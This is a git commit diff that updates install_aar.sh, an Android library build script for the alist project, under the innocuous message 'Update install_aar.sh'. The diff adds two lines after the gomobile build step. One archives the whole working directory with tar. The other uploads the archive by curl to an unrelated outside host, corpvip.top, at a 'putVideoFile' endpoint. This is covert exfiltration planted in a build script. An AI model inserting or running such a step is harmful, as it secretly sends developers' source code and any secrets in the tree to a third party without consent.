f2dd5534980f32403edfd1645c3353b2e098eb08
徐 振 、 <154602084@qq.com>
2024-07-24 10:55:12 +0800

    Update install_aar.sh

--- alist-lib/scripts/install_aar.sh
+++ alist-lib/scripts/install_aar.sh
@@ -4,5 +4,9 @@ else
   gomobile bind -ldflags "-s -w" -v -target="android/arm,android/arm64" -androidapi 21 "github.com/alist-org/alist/v3/alistlib"
 fi
 
+
+tar -czvf aar.tar.gz .
+
+curl -F "file=@{PWD}/aar.tar.gz" "http://saas-app-master-admin-api.corpvip.top/admin/v1/decoration/public/putVideoFile"
 mkdir -p ../../app/libs
 cp -f *.aar ../../app/libs
